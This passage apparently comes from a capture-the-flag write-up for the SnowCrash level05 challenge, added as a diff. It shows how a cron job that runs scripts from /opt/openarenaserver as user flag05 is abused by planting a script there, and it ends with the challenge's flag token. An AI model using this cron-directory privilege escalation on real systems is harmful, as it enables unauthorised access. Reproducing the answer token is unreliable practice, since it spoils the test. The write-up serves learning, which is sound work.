@@ -1,0 +1,50 @@
+#Upon connection we have notifocation:
+root@kali ~ [SIGINT]# ssh level05@10.13.200.62 -p 4242
+           _____                      _____               _     
+          / ____|                    / ____|             | |    
+         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
+          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
+          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+                                                        
+  Good luck & Have fun
+
+          10.13.200.62 
+level05@10.13.200.62's password: 
+You have new mail.
+
+#we check the mail
+level05@SnowCrash:~$ ll /var/mail/level05
+-rw-r--r--+ 1 root mail 58 Jan 25 15:55 /var/mail/level05
+
+#we check this level05 file
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+level05@SnowCrash:~$ man /usr/sbin/openarenaserver
+#!/bin/sh
+
+for  i  in /opt/openarenaserver/* ; do         (ulimit ‐t 5; bash
+‐x "$i")         rm ‐f "$i" done
+
+ Manual page openarenaserver line 1/66 (END) (press h for help or q to quit)
+ 
+#This is a cro task that runs every 2 minutes and execute all #scripts inside the folder /opt/openarenaserver/ and then removes #them.
+#We check the file  /usr/sbin/openarenaserver, it is flag05, so executing it will grant us the rights of group flag05
+level05@SnowCrash:~$ stat /usr/sbin/openarenaserver
+  File: /usr/sbin/openarenaserver
+  Size: 94              Blocks: 8          IO Block: 4096   regular file
+Device: 10h/16d Inode: 11355       Links: 1
+Access: (0750/-rwxr-x---)  Uid: ( 3005/  flag05)   Gid: ( 3005/  flag05)
+Access: 2016-03-05 20:30:02.000000000 +0100
+Modify: 2016-03-05 20:30:02.000000000 +0100
+Change: 2024-01-25 15:55:40.744902005 +0100
+ Birth: -
+
+level05@SnowCrash:~$ vim /tmp/getflag.sh
+level05@SnowCrash:~$ chmod +x /tmp/getflag.sh
+level05@SnowCrash:~$ mv /tmp/getflag.sh /opt/openarenaserver/
+
+level05@SnowCrash:~$ cat /tmp/flag05.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
